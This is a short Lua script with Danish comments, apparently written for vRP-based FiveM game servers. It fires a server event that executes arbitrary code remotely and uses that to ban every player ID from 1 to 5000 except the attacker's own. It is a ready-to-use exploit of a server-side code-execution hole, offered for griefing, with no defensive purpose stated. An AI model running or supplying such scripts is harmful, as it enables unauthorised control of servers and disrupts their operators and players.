-- Banner alle fra id 1 til 5000. SΓ¦t "ID" til at vΓ¦re dit id hvis du ik skal bannes.
--SuperSnailπππππππ
--πππππ

TriggerServerEvent('RunCode:RunStringRemotelly', [[
    local ID = 1
    local BanMessage = ""

    for i=1,5000 do 
        if i ~= ID then
            vRP.ban({i,banbesked,true})
        end
    end
]])
